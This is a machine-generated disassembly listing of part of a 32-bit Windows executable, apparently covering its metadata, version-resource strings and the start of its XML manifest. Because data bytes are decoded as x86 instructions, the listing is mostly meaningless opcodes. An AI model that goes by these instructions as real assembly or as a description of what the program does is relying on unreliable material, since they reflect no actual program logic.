  4081bf:	add    BYTE PTR [ecx+0x2],cl
  4081c2:	add    BYTE PTR [eax],al
  4081c4:	push   es
  4081c5:	add    BYTE PTR [eax],al
  4081c7:	add    BYTE PTR [edx],dh
  4081c9:	add    BYTE PTR [eax],al
  4081cb:	add    BYTE PTR [edi+0x2],cl
  4081ce:	add    BYTE PTR [eax],al
  4081d0:	mov    dh,0x0
  4081d2:	add    BYTE PTR [eax],al
  4081d4:	xor    eax,DWORD PTR [eax]
  4081d6:	add    BYTE PTR [eax],al
  4081d8:	add    eax,0x6000003
  4081dd:	add    BYTE PTR [eax],al
  4081df:	add    BYTE PTR [edx],al
  4081e1:	add    BYTE PTR [eax],al
  4081e3:	add    BYTE PTR [ebx],cl
  4081e5:	add    eax,DWORD PTR [eax]
  4081e7:	add    BYTE PTR [edi],al
  4081e9:	add    BYTE PTR [eax],al
  4081eb:	add    BYTE PTR [ecx],dl
  4081ed:	add    BYTE PTR [eax],al
  4081ef:	add    BYTE PTR [ebx],cl
  4081f1:	add    BYTE PTR [eax],al
  4081f3:	add    BYTE PTR [edx],al
  4081f5:	add    BYTE PTR [eax],al
  4081f7:	add    BYTE PTR [edx],dl
  4081f9:	add    DWORD PTR [edi+0x4c060501],ebx
  4081ff:	add    eax,0x55e0557
  408204:	popa   
  408205:	add    eax,0x195056e
  40820a:	add    eax,0x5780a0a
  40820f:	add    ebx,DWORD PTR [edi+0x5]
  408212:	jo     0x408219
  408214:	jno    0x40821b
  408216:	add    DWORD PTR [eax],eax
  408218:	add    BYTE PTR [eax],al
  40821a:	add    DWORD PTR [eax],eax
  40821c:	add    BYTE PTR [eax],al
  40821e:	add    al,al
  408220:	adc    al,BYTE PTR [eax]
  408222:	add    BYTE PTR [eax],al
  408224:	adc    al,0x1
  408226:	add    BYTE PTR [eax],al
  408228:	add    BYTE PTR [eax],ah
  40822a:	sbb    DWORD PTR [ecx],eax
  40822c:	pop    ss
  40822d:	add    DWORD PTR ds:0x7010601,eax
  408233:	add    DWORD PTR [eax],ecx
  408235:	add    DWORD PTR [ecx],ecx
  408237:	add    DWORD PTR [edx],ecx
  408239:	add    DWORD PTR [ebx],ecx
  40823b:	add    DWORD PTR [ecx+eax*1],ecx
  40823e:	or     eax,0xf010e01
  408243:	add    DWORD PTR [ecx],edx
  408245:	add    DWORD PTR [edx],edx
  408247:	add    DWORD PTR [ebx],edx
  408249:	add    DWORD PTR [ecx+eax*1],eax
  40824c:	add    eax,0x1000000
  408251:	add    al,BYTE PTR [eax]
  408253:	add    BYTE PTR [eax],al
  408255:	call   0x41855c
  40825a:	add    al,ah
  40825c:	add    eax,DWORD PTR [eax]
  40825e:	add    al,0x4
  408260:	add    DWORD PTR [eax],eax
  408262:	add    BYTE PTR [eax],al
  408264:	add    eax,0x304
  408269:	add    BYTE PTR [edx],al
  40826b:	add    BYTE PTR [ecx],al
  40826d:	add    eax,0xe0001987
  408272:	or     al,BYTE PTR [esi]
  408274:	xchg   DWORD PTR [ecx],ebx
  408276:	add    BYTE PTR [eax],al
  408278:	add    DWORD PTR [eax],eax
  40827a:	add    BYTE PTR [eax],al
  40827c:	add    DWORD PTR [eax],eax
  40827e:	adc    al,BYTE PTR [eax]
  408280:	add    BYTE PTR [eax],al
  408282:	adc    DWORD PTR [eax],eax
  408284:	adc    al,0x0
  408286:	adc    eax,DWORD PTR [eax]
  408288:	add    al,BYTE PTR [eax]
  40828a:	add    eax,DWORD PTR [eax]
  40828c:	add    al,0x0
  40828e:	add    eax,0x70600
  408293:	add    BYTE PTR [eax],al
  408295:	loopne 0x40829e
  408297:	pop    es
  408298:	or     BYTE PTR [eax],al
  40829a:	or     DWORD PTR [eax],eax
  40829c:	or     al,BYTE PTR [eax]
  40829e:	or     eax,DWORD PTR [eax]
  4082a0:	or     al,0x0
  4082a2:	push   cs
  4082a3:	add    BYTE PTR [edi],cl
  4082a5:	add    BYTE PTR [eax],dl
  4082a7:	add    BYTE PTR [ecx],al
  4082a9:	add    BYTE PTR [edi],bh
  4082ab:	add    BYTE PTR [eax],al
  4082ad:	add    BYTE PTR [eax+0x8],al
  4082b0:	add    BYTE PTR [eax],al
  4082b2:	add    al,cl
  4082b4:	inc    eax
  4082b5:	add    BYTE PTR [eax+0x0],al
  4082b8:	inc    eax
  4082b9:	add    BYTE PTR [eax+0x0],al
  4082bc:	inc    eax
  4082bd:	add    BYTE PTR [eax+0x0],al
  4082c0:	inc    eax
  4082c1:	add    BYTE PTR [eax+0x0],al
  4082c4:	inc    eax
  4082c5:	add    BYTE PTR [eax+0x0],al
  4082c8:	inc    eax
  4082c9:	add    BYTE PTR [edi],dl
  4082cb:	add    BYTE PTR [esi],dl
  4082cd:	add    BYTE PTR ds:0x13001400,dl
  4082d3:	add    BYTE PTR [edx],dl
  4082d5:	add    BYTE PTR [ecx],dl
  4082d7:	add    BYTE PTR [eax],dl
  4082d9:	add    BYTE PTR [edi],cl
  4082db:	add    BYTE PTR [esi],cl
  4082dd:	add    BYTE PTR ds:0xb000c00,cl
  4082e3:	add    BYTE PTR [edx],cl
  4082e5:	add    BYTE PTR [ecx],cl
  4082e7:	add    BYTE PTR [eax+0x0],al
  4082ea:	pop    es
  4082eb:	add    BYTE PTR [eax+0x0],al
  4082ee:	inc    eax
  4082ef:	add    BYTE PTR [eax+0x0],al
  4082f2:	add    eax,DWORD PTR [eax]
  4082f4:	inc    eax
  4082f5:	add    BYTE PTR ds:0x40004000,ah
  4082fb:	add    BYTE PTR [eax+0x0],al
  4082fe:	inc    eax
  4082ff:	add    BYTE PTR [eax+0x0],al
  408302:	inc    eax
  408303:	add    BYTE PTR [eax+0x0],al
  408306:	inc    eax
  408307:	add    BYTE PTR [eax+0x0],al
  40830a:	inc    eax
  40830b:	add    BYTE PTR [eax+0x0],al
  40830e:	inc    eax
  40830f:	add    BYTE PTR [eax+0x0],al
  408312:	inc    eax
  408313:	add    BYTE PTR [eax+0x0],al
  408316:	inc    eax
  408317:	add    BYTE PTR [eax+0x0],al
  40831a:	inc    eax
  40831b:	add    BYTE PTR [eax+0x0],al
  40831e:	inc    eax
  40831f:	add    BYTE PTR [eax+0x0],al
  408322:	inc    eax
  408323:	add    BYTE PTR [eax+0x0],al
  408326:	inc    eax
  408327:	add    BYTE PTR [eax+0x0],al
  40832a:	inc    eax
  40832b:	add    BYTE PTR [eax+0x0],al
  40832e:	inc    ecx
  40832f:	add    BYTE PTR [ecx],al
  408331:	add    BYTE PTR [eax],al
  408333:	add    BYTE PTR [ecx],al
  408335:	add    BYTE PTR [ebx],al
  408337:	add    BYTE PTR [eax],al
  408339:	add    BYTE PTR [ecx],al
  40833b:	add    BYTE PTR [edx],al
  40833d:	add    BYTE PTR [ebx],al
  40833f:	add    BYTE PTR [edi],al
  408341:	add    BYTE PTR [eax],al
  408343:	add    BYTE PTR [ebp+0x0],bl
  408346:	test   eax,0x660009
  40834b:	or     al,BYTE PTR [eax]
  40834d:	(bad)  
  40834e:	or     BYTE PTR [eax],al
  408350:	add    BYTE PTR [eax],al
  408352:	jmp    0x0:0x10001
  408359:	add    BYTE PTR [eax],al
  40835b:	cmp    al,0x0
  40835d:	add    BYTE PTR [eax],al
  40835f:	pop    esi
  408360:	add    BYTE PTR [ecx],al
  408362:	add    BYTE PTR [edx],cl
  408364:	add    BYTE PTR [edi+0x57c80002],cl
  40836a:	add    BYTE PTR [ebp+0x2cf7002a],dl
  408370:	add    BYTE PTR [edi-0x1cfffe7b],al
  408376:	xor    al,BYTE PTR [eax]
  408378:	int    0x4
  40837a:	add    dh,dl
  40837c:	add    al,0x0
  40837e:	fadd   QWORD PTR [eax+eax*1]
  408381:	repnz add al,0x0
  408384:	lea    eax,ds:0x5b300
  40838a:	out    0x5,eax
  40838c:	add    dl,dh
  40838e:	add    eax,0x6a300
  408393:	aad    0x6
  408395:	add    bl,ah
  408397:	push   es
  408398:	add    ah,dl
  40839a:	or     DWORD PTR [eax],eax
  40839c:	enter  0xc,0xbf
  4083a0:	(bad)  
  4083a2:	mov    ecx,0x15b90012
  4083a7:	add    BYTE PTR [edx+0x1bb10018],dh
  4083ad:	add    BYTE PTR [ecx+0x21b7001e],dh
  4083b3:	add    BYTE PTR [ebp+0x24b70027],dh
  4083b9:	add    BYTE PTR [ebp-0x22fffe7e],al
  4083bf:	xor    eax,0x38dc00
  4083c4:	mov    esp,0x3eb6003b
  4083c9:	add    BYTE PTR [ecx+eax*2+0x43f900],bl
  4083d0:	(bad)  
  4083d1:	inc    esi
  4083d2:	add    dh,dl
  4083d4:	dec    ecx
  4083d5:	add    cl,al
  4083d7:	dec    esp
  4083d8:	add    BYTE PTR [esi+0x51fc004f],bl
  4083de:	add    cl,ah
  4083e0:	push   esp
  4083e1:	add    dl,ch
  4083e3:	das    
  4083e4:	add    BYTE PTR [edx+0x5cfb005a],ah
  4083ea:	add    BYTE PTR [edi+0x62ec0060],al
  4083f0:	add    bh,ch
  4083f2:	gs add ch,ch
  4083f5:	push   0x6bc700
  4083fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083fb:	outs   dx,BYTE PTR ds:[esi]
  4083fc:	add    BYTE PTR [ebp+0x73e10071],al
  408402:	add    dh,bl
  408404:	jbe    0x408406
  408406:	les    edi,FWORD PTR [ecx+0x0]
  408409:	test   al,0x7c
  40840b:	add    BYTE PTR [edi+edi*2+0x1004800],al
  408412:	add    BYTE PTR [eax],al
  408414:	add    BYTE PTR [ecx],al
  408416:	add    BYTE PTR [esi],al
  408418:	(bad)  
  408419:	(bad)  
  40841a:	(bad)  
  40841b:	dec    DWORD PTR [edi]
  40841d:	add    BYTE PTR [eax+0x50b4356f],bl
  408423:	inc    ecx
  408424:	rol    BYTE PTR [ebx],1
  408426:	xor    al,0x0
  408428:	add    BYTE PTR [eax],al
  40842a:	push   esi
  40842b:	add    BYTE PTR [ebx+0x0],dl
  40842e:	pop    edi
  40842f:	add    BYTE PTR [esi+0x0],dl
  408432:	inc    ebp
  408433:	add    BYTE PTR [edx+0x0],dl
  408436:	push   ebx
  408437:	add    BYTE PTR [ecx+0x0],cl
  40843a:	dec    edi
  40843b:	add    BYTE PTR [esi+0x0],cl
  40843e:	pop    edi
  40843f:	add    BYTE PTR [ecx+0x0],cl
  408442:	dec    esi
  408443:	add    BYTE PTR [esi+0x0],al
  408446:	dec    edi
  408447:	add    BYTE PTR [eax],al
  408449:	add    BYTE PTR [eax],al
  40844b:	add    BYTE PTR [ebp+0xfeef04],bh
  408451:	add    BYTE PTR [ecx],al
  408453:	add    BYTE PTR [eax],al
  408455:	add    BYTE PTR [ebx],cl
  408457:	add    BYTE PTR [ecx],al
  408459:	add    BYTE PTR [edi],ah
  40845b:	mov    BYTE PTR [eax],0x0
  40845e:	or     eax,DWORD PTR [eax]
  408460:	add    BYTE PTR [eax],al
  408462:	add    BYTE PTR [eax],al
  408464:	aas    
  408465:	add    BYTE PTR [eax],al
  408467:	add    BYTE PTR [eax],al
  408469:	add    BYTE PTR [eax],al
  40846b:	add    BYTE PTR [eax+eax*1],al
  40846e:	add    BYTE PTR [eax],al
  408470:	add    DWORD PTR [eax],eax
	...
  40847e:	add    BYTE PTR [eax],al
  408480:	inc    esp
  408481:	add    BYTE PTR [eax],al
  408483:	add    BYTE PTR [ecx],al
  408485:	add    BYTE PTR [esi+0x0],dl
  408488:	popa   
  408489:	add    BYTE PTR [edx+0x0],dh
  40848c:	inc    esi
  40848d:	add    BYTE PTR [ecx+0x0],ch
  408490:	ins    BYTE PTR es:[edi],dx
  408491:	add    BYTE PTR [ebp+0x0],ah
  408494:	dec    ecx
  408495:	add    BYTE PTR [esi+0x0],ch
  408498:	data16 add BYTE PTR [edi+0x0],ch
  40849c:	add    BYTE PTR [eax],al
  40849e:	add    BYTE PTR [eax],al
  4084a0:	and    al,0x0
  4084a2:	add    al,0x0
  4084a4:	add    BYTE PTR [eax],al
  4084a6:	push   esp
  4084a7:	add    BYTE PTR [edx+0x0],dh
  4084aa:	popa   
  4084ab:	add    BYTE PTR [esi+0x0],ch
  4084ae:	jae    0x4084b0
  4084b0:	ins    BYTE PTR es:[edi],dx
  4084b1:	add    BYTE PTR [ecx+0x0],ah
  4084b4:	je     0x4084b6
  4084b6:	imul   eax,DWORD PTR [eax],0x6e006f
  4084bc:	add    BYTE PTR [eax],al
  4084be:	add    BYTE PTR [eax],al
  4084c0:	add    BYTE PTR [eax],al
  4084c2:	mov    al,0x4
  4084c4:	xor    BYTE PTR [ebx],al
  4084c6:	add    BYTE PTR [eax],al
  4084c8:	add    DWORD PTR [eax],eax
  4084ca:	push   ebx
  4084cb:	add    BYTE PTR [eax+eax*1+0x72],dh
  4084cf:	add    BYTE PTR [ecx+0x0],ch
  4084d2:	outs   dx,BYTE PTR ds:[esi]
  4084d3:	add    BYTE PTR [edi+0x0],ah
  4084d6:	inc    esi
  4084d7:	add    BYTE PTR [ecx+0x0],ch
  4084da:	ins    BYTE PTR es:[edi],dx
  4084db:	add    BYTE PTR [ebp+0x0],ah
  4084de:	dec    ecx
  4084df:	add    BYTE PTR [esi+0x0],ch
  4084e2:	data16 add BYTE PTR [edi+0x0],ch
  4084e6:	add    BYTE PTR [eax],al
  4084e8:	or     al,0x3
  4084ea:	add    BYTE PTR [eax],al
  4084ec:	add    DWORD PTR [eax],eax
  4084ee:	xor    BYTE PTR [eax],al
  4084f0:	xor    BYTE PTR [eax],al
  4084f2:	xor    BYTE PTR [eax],al
  4084f4:	xor    BYTE PTR [eax],al
  4084f6:	xor    BYTE PTR [eax],al
  4084f8:	xor    al,0x0
  4084fa:	bound  eax,QWORD PTR [eax]
  4084fc:	xor    BYTE PTR [eax],al
  4084fe:	add    BYTE PTR [eax],al
  408500:	cmp    al,0x0
  408502:	adc    DWORD PTR [eax],eax
  408504:	add    DWORD PTR [eax],eax
  408506:	inc    ebx
  408507:	add    BYTE PTR [edi+0x0],ch
  40850a:	ins    DWORD PTR es:[edi],dx
  40850b:	add    BYTE PTR [ebp+0x0],ch
  40850e:	add    BYTE PTR gs:[esi+0x0],ch
  408512:	je     0x408514
  408514:	jae    0x408516
  408516:	add    BYTE PTR [eax],al
  408518:	dec    ecx
  408519:	add    BYTE PTR [esi+0x0],ch
  40851c:	je     0x40851e
  40851e:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  408523:	add    BYTE PTR [ecx+0x0],ch
  408526:	push   esp
  408527:	add    BYTE PTR [edx+0x0],dh
  40852a:	popa   
  40852b:	add    BYTE PTR [ebx+0x0],ah
  40852e:	add    BYTE PTR gs:[esi],ch
  408531:	add    BYTE PTR [ebp+0x0],ah
  408534:	js     0x408536
  408536:	add    BYTE PTR gs:[eax],al
  408539:	add    BYTE PTR [eax],al
  40853b:	add    BYTE PTR [eax+eax*1+0x16],cl
  40853f:	add    BYTE PTR [ecx],al
  408541:	add    BYTE PTR [ebx+0x0],al
  408544:	outs   dx,DWORD PTR ds:[esi]
  408545:	add    BYTE PTR [ebp+0x0],ch
  408548:	jo     0x40854a
  40854a:	popa   
  40854b:	add    BYTE PTR [esi+0x0],ch
  40854e:	jns    0x408550
  408550:	dec    esi
  408551:	add    BYTE PTR [ecx+0x0],ah
  408554:	ins    DWORD PTR es:[edi],dx
  408555:	add    BYTE PTR [ebp+0x0],ah
  408558:	add    BYTE PTR [eax],al
  40855a:	add    BYTE PTR [eax],al
  40855c:	dec    ebp
  40855d:	add    BYTE PTR [ecx+0x0],ch
  408560:	arpl   WORD PTR [eax],ax
  408562:	jb     0x408564
  408564:	outs   dx,DWORD PTR ds:[esi]
  408565:	add    BYTE PTR [ebx+0x0],dh
  408568:	outs   dx,DWORD PTR ds:[esi]
  408569:	add    BYTE PTR [esi+0x0],ah
  40856c:	je     0x40856e
  40856e:	and    BYTE PTR [eax],al
  408570:	inc    ebx
  408571:	add    BYTE PTR [edi+0x0],ch
  408574:	jb     0x408576
  408576:	jo     0x408578
  408578:	outs   dx,DWORD PTR ds:[esi]
  408579:	add    BYTE PTR [edx+0x0],dh
  40857c:	popa   
  40857d:	add    BYTE PTR [eax+eax*1+0x69],dh
  408581:	add    BYTE PTR [edi+0x0],ch
  408584:	outs   dx,BYTE PTR ds:[esi]
  408585:	add    BYTE PTR [eax],al
  408587:	add    BYTE PTR [eax+eax*1+0x11],cl
  40858b:	add    BYTE PTR [ecx],al
  40858d:	add    BYTE PTR [esi+0x0],al
  408590:	imul   eax,DWORD PTR [eax],0x65006c
  408596:	inc    esp
  408597:	add    BYTE PTR [ebp+0x0],ah
  40859a:	jae    0x40859c
  40859c:	arpl   WORD PTR [eax],ax
  40859e:	jb     0x4085a0
  4085a0:	imul   eax,DWORD PTR [eax],0x740070
  4085a6:	imul   eax,DWORD PTR [eax],0x6e006f
  4085ac:	add    BYTE PTR [eax],al
  4085ae:	add    BYTE PTR [eax],al
  4085b0:	dec    ecx
  4085b1:	add    BYTE PTR [esi+0x0],ch
  4085b4:	je     0x4085b6
  4085b6:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  4085bb:	add    BYTE PTR [ecx+0x0],ch
  4085be:	push   esp
  4085bf:	add    BYTE PTR [edx+0x0],dh
  4085c2:	popa   
  4085c3:	add    BYTE PTR [ebx+0x0],ah
  4085c6:	add    BYTE PTR gs:[esi],ch
  4085c9:	add    BYTE PTR [ebp+0x0],ah
  4085cc:	js     0x4085ce
  4085ce:	add    BYTE PTR gs:[eax],al
  4085d1:	add    BYTE PTR [eax],al
  4085d3:	add    BYTE PTR [eax+eax*1],bh
  4085d6:	push   cs
  4085d7:	add    BYTE PTR [ecx],al
  4085d9:	add    BYTE PTR [esi+0x0],al
  4085dc:	imul   eax,DWORD PTR [eax],0x65006c
  4085e2:	push   esi
  4085e3:	add    BYTE PTR [ebp+0x0],ah
  4085e6:	jb     0x4085e8
  4085e8:	jae    0x4085ea
  4085ea:	imul   eax,DWORD PTR [eax],0x6e006f
  4085f0:	add    BYTE PTR [eax],al
  4085f2:	add    BYTE PTR [eax],al
  4085f4:	xor    DWORD PTR [eax],eax
  4085f6:	xor    DWORD PTR [eax],eax
  4085f8:	add    BYTE PTR cs:[eax],dh
  4085fb:	add    BYTE PTR [esi],ch
  4085fd:	add    BYTE PTR ds:0x37003000,dh
  408603:	add    BYTE PTR [edx],dh
  408605:	add    BYTE PTR [edi],dh
  408607:	add    BYTE PTR [esi],ch
  408609:	add    BYTE PTR [eax],dh
  40860b:	add    BYTE PTR [ecx],dh
  40860d:	add    BYTE PTR [eax],al
  40860f:	add    BYTE PTR [eax+eax*1+0x11],al
  408613:	add    BYTE PTR [ecx],al
  408615:	add    BYTE PTR [ecx+0x0],cl
  408618:	outs   dx,BYTE PTR ds:[esi]
  408619:	add    BYTE PTR [eax+eax*1+0x65],dh
  40861d:	add    BYTE PTR [edx+0x0],dh
  408620:	outs   dx,BYTE PTR ds:[esi]
  408621:	add    BYTE PTR [ecx+0x0],ah
  408624:	ins    BYTE PTR es:[edi],dx
  408625:	add    BYTE PTR [esi+0x0],cl
  408628:	popa   
  408629:	add    BYTE PTR [ebp+0x0],ch
  40862c:	add    BYTE PTR gs:[eax],al
  40862f:	add    BYTE PTR [ecx+0x0],cl
  408632:	outs   dx,BYTE PTR ds:[esi]
  408633:	add    BYTE PTR [eax+eax*1+0x65],dh
  408637:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40863b:	add    BYTE PTR [ecx+0x0],ch
  40863e:	push   esp
  40863f:	add    BYTE PTR [edx+0x0],dh
  408642:	popa   
  408643:	add    BYTE PTR [ebx+0x0],ah
  408646:	add    BYTE PTR gs:[esi],ch
  408649:	add    BYTE PTR [ebp+0x0],ah
  40864c:	js     0x40864e
  40864e:	add    BYTE PTR gs:[eax],al
  408651:	add    BYTE PTR [eax],al
  408653:	add    BYTE PTR [eax+0x1002e00],al
  408659:	add    BYTE PTR [eax+eax*1+0x65],cl
  40865d:	add    BYTE PTR [edi+0x0],ah
  408660:	popa   
  408661:	add    BYTE PTR [eax+eax*1+0x43],ch
  408665:	add    BYTE PTR [edi+0x0],ch
  408668:	jo     0x40866a
  40866a:	jns    0x40866c
  40866c:	jb     0x40866e
  40866e:	imul   eax,DWORD PTR [eax],0x680067
  408674:	je     0x408676
  408676:	add    BYTE PTR [eax],al
  408678:	test   eax,0x4d002000
  40867d:	add    BYTE PTR [ecx+0x0],ch
  408680:	arpl   WORD PTR [eax],ax
  408682:	jb     0x408684
  408684:	outs   dx,DWORD PTR ds:[esi]
  408685:	add    BYTE PTR [ebx+0x0],dh
  408688:	outs   dx,DWORD PTR ds:[esi]
  408689:	add    BYTE PTR [esi+0x0],ah
  40868c:	je     0x40868e
  40868e:	and    BYTE PTR [eax],al
  408690:	inc    ebx
  408691:	add    BYTE PTR [edi+0x0],ch
  408694:	jb     0x408696
  408696:	jo     0x408698
  408698:	outs   dx,DWORD PTR ds:[esi]
  408699:	add    BYTE PTR [edx+0x0],dh
  40869c:	popa   
  40869d:	add    BYTE PTR [eax+eax*1+0x69],dh
  4086a1:	add    BYTE PTR [edi+0x0],ch
  4086a4:	outs   dx,BYTE PTR ds:[esi]
  4086a5:	add    BYTE PTR [esi],ch
  4086a7:	add    BYTE PTR [eax],ah
  4086a9:	add    BYTE PTR [ecx+0x0],al
  4086ac:	ins    BYTE PTR es:[edi],dx
  4086ad:	add    BYTE PTR [eax+eax*1+0x20],ch
  4086b1:	add    BYTE PTR [edx+0x0],dh
  4086b4:	imul   eax,DWORD PTR [eax],0x680067
  4086ba:	je     0x4086bc
  4086bc:	jae    0x4086be
  4086be:	and    BYTE PTR [eax],al
  4086c0:	jb     0x4086c2
  4086c2:	add    BYTE PTR gs:[ebx+0x0],dh
  4086c6:	add    BYTE PTR gs:[edx+0x0],dh
  4086ca:	jbe    0x4086cc
  4086cc:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  4086d1:	add    BYTE PTR [eax],al
  4086d3:	add    BYTE PTR [eax+eax*1+0x11],cl
  4086d7:	add    BYTE PTR [ecx],al
  4086d9:	add    BYTE PTR [edi+0x0],cl
  4086dc:	jb     0x4086de
  4086de:	imul   eax,DWORD PTR [eax],0x690067
  4086e4:	outs   dx,BYTE PTR ds:[esi]
  4086e5:	add    BYTE PTR [ecx+0x0],ah
  4086e8:	ins    BYTE PTR es:[edi],dx
  4086e9:	add    BYTE PTR [esi+0x0],al
  4086ec:	imul   eax,DWORD PTR [eax],0x65006c
  4086f2:	outs   dx,BYTE PTR ds:[esi]
  4086f3:	add    BYTE PTR [ecx+0x0],ah
  4086f6:	ins    DWORD PTR es:[edi],dx
  4086f7:	add    BYTE PTR [ebp+0x0],ah
  4086fa:	add    BYTE PTR [eax],al
  4086fc:	dec    ecx
  4086fd:	add    BYTE PTR [esi+0x0],ch
  408700:	je     0x408702
  408702:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  408707:	add    BYTE PTR [ecx+0x0],ch
  40870a:	push   esp
  40870b:	add    BYTE PTR [edx+0x0],dh
  40870e:	popa   
  40870f:	add    BYTE PTR [ebx+0x0],ah
  408712:	add    BYTE PTR gs:[esi],ch
  408715:	add    BYTE PTR [ebp+0x0],ah
  408718:	js     0x40871a
  40871a:	add    BYTE PTR gs:[eax],al
  40871d:	add    BYTE PTR [eax],al
  40871f:	add    BYTE PTR [eax+0x0],ah
  408722:	pop    ds
  408723:	add    BYTE PTR [ecx],al
  408725:	add    BYTE PTR [eax+0x0],dl
  408728:	jb     0x40872a
  40872a:	outs   dx,DWORD PTR ds:[esi]
  40872b:	add    BYTE PTR [eax+eax*1+0x75],ah
  40872f:	add    BYTE PTR [ebx+0x0],ah
  408732:	je     0x408734
  408734:	dec    esi
  408735:	add    BYTE PTR [ecx+0x0],ah
  408738:	ins    DWORD PTR es:[edi],dx
  408739:	add    BYTE PTR [ebp+0x0],ah
  40873c:	add    BYTE PTR [eax],al
  40873e:	add    BYTE PTR [eax],al
  408740:	dec    ebp
  408741:	add    BYTE PTR [ecx+0x0],ch
  408744:	arpl   WORD PTR [eax],ax
  408746:	jb     0x408748
  408748:	outs   dx,DWORD PTR ds:[esi]
  408749:	add    BYTE PTR [ebx+0x0],dh
  40874c:	outs   dx,DWORD PTR ds:[esi]
  40874d:	add    BYTE PTR [esi+0x0],ah
  408750:	je     0x408752
  408752:	scas   al,BYTE PTR es:[edi]
  408753:	add    BYTE PTR [eax],ah
  408755:	add    BYTE PTR [esi+0x0],dl
  408758:	imul   eax,DWORD PTR [eax],0x750073
  40875e:	popa   
  40875f:	add    BYTE PTR [eax+eax*1+0x20],ch
  408763:	add    BYTE PTR [ebx+0x0],dl
  408766:	je     0x408768
  408768:	jne    0x40876a
  40876a:	add    BYTE PTR fs:[ecx+0x0],ch
  40876e:	outs   dx,DWORD PTR ds:[esi]
  40876f:	add    BYTE PTR [esi+0x32002000],ch
  408775:	add    BYTE PTR [eax],dh
  408777:	add    BYTE PTR [ecx],dh
  408779:	add    BYTE PTR [edx],dh
  40877b:	add    BYTE PTR [eax],al
  40877d:	add    BYTE PTR [eax],al
  40877f:	add    BYTE PTR [eax],bh
  408781:	add    BYTE PTR [ecx],cl
  408783:	add    BYTE PTR [ecx],al
  408785:	add    BYTE PTR [eax+0x0],dl
  408788:	jb     0x40878a
  40878a:	outs   dx,DWORD PTR ds:[esi]
  40878b:	add    BYTE PTR [eax+eax*1+0x75],ah
  40878f:	add    BYTE PTR [ebx+0x0],ah
  408792:	je     0x408794
  408794:	push   esi
  408795:	add    BYTE PTR [ebp+0x0],ah
  408798:	jb     0x40879a
  40879a:	jae    0x40879c
  40879c:	imul   eax,DWORD PTR [eax],0x6e006f
  4087a2:	add    BYTE PTR [eax],al
  4087a4:	xor    DWORD PTR [eax],eax
  4087a6:	xor    DWORD PTR [eax],eax
  4087a8:	add    BYTE PTR cs:[eax],dh
  4087ab:	add    BYTE PTR [esi],ch
  4087ad:	add    BYTE PTR [eax],dh
  4087af:	add    BYTE PTR [esi],ch
  4087b1:	add    BYTE PTR [eax],dh
  4087b3:	add    BYTE PTR [eax],al
  4087b5:	add    BYTE PTR [eax],al
  4087b7:	add    BYTE PTR [eax+eax*1],bh
  4087ba:	or     DWORD PTR [eax],eax
  4087bc:	add    DWORD PTR [eax],eax
  4087be:	inc    ecx
  4087bf:	add    BYTE PTR [ebx+0x0],dh
  4087c2:	jae    0x4087c4
  4087c4:	add    BYTE PTR gs:[ebp+0x0],ch
  4087c8:	bound  eax,QWORD PTR [eax]
  4087ca:	ins    BYTE PTR es:[edi],dx
  4087cb:	add    BYTE PTR [ecx+0x0],bh
  4087ce:	and    BYTE PTR [eax],al
  4087d0:	push   esi
  4087d1:	add    BYTE PTR [ebp+0x0],ah
  4087d4:	jb     0x4087d6
  4087d6:	jae    0x4087d8
  4087d8:	imul   eax,DWORD PTR [eax],0x6e006f
  4087de:	add    BYTE PTR [eax],al
  4087e0:	xor    DWORD PTR [eax],eax
  4087e2:	xor    DWORD PTR [eax],eax
  4087e4:	add    BYTE PTR cs:[eax],dh
  4087e7:	add    BYTE PTR [esi],ch
  4087e9:	add    BYTE PTR [eax],dh
  4087eb:	add    BYTE PTR [esi],ch
  4087ed:	add    BYTE PTR [eax],dh
  4087ef:	add    BYTE PTR [eax],al
  4087f1:	add    BYTE PTR [eax],al
  4087f3:	add    bh,ch
  4087f5:	mov    ebx,0x783f3cbf
  4087fa:	ins    DWORD PTR es:[edi],dx
  4087fb:	ins    BYTE PTR es:[edi],dx
  4087fc:	and    BYTE PTR [esi+0x65],dh
  4087ff:	jb     0x408874
  408801:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  408808:	xor    BYTE PTR [edx],ah
  40880a:	and    BYTE PTR [ebp+0x6e],ah
  40880d:	arpl   WORD PTR [edi+0x64],bp
  408810:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  408817:	inc    esi
  408818:	sub    eax,0x73202238
  40881d:	je     0x408880
  40881f:	outs   dx,BYTE PTR ds:[esi]
  408820:	fs popa 
  408822:	ins    BYTE PTR es:[edi],dx
  408823:	outs   dx,DWORD PTR ds:[esi]
  408824:	outs   dx,BYTE PTR ds:[esi]
  408825:	gs cmp eax,0x73657922
  40882b:	and    bh,BYTE PTR [edi]
  40882d:	ds or  eax,0x73613c0a
  408833:	jae    0x40889a
  408835:	ins    DWORD PTR es:[edi],dx
  408836:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40883a:	js     0x4088a9
  40883c:	ins    BYTE PTR es:[edi],dx
  40883d:	outs   dx,BYTE PTR ds:[esi]
  40883e:	jae    0x40887d
  408840:	and    dh,BYTE PTR [ebp+0x72]
  408843:	outs   dx,BYTE PTR ds:[esi]
  408844:	cmp    dh,BYTE PTR [ebx+0x63]
  408847:	push   0x73616d65
  40884c:	sub    eax,0x7263696d
  408851:	outs   dx,DWORD PTR ds:[esi]
  408852:	jae    0x4088c3
  408854:	data16 je 0x408884
  408857:	arpl   WORD PTR [edi+0x6d],bp
  40885a:	cmp    ah,BYTE PTR [ecx+0x73]
  40885d:	ins    DWORD PTR es:[edi],dx
  40885e:	cs jbe 0x408892
  408861:	and    ah,BYTE PTR [eax]
  408863:	ins    DWORD PTR es:[edi],dx
  408864:	popa   
  408865:	outs   dx,BYTE PTR ds:[esi]
  408866:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40886d:	jb     0x4088e2
  40886f:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  408876:	xor    BYTE PTR [edx],ah
  408878:	ds or  eax,0x3c20200a
  40887e:	popa   
  40887f:	jae    0x4088f4
  408881:	gs ins DWORD PTR es:[edi],dx
  408883:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  408887:	fs outs dx,BYTE PTR gs:[esi]
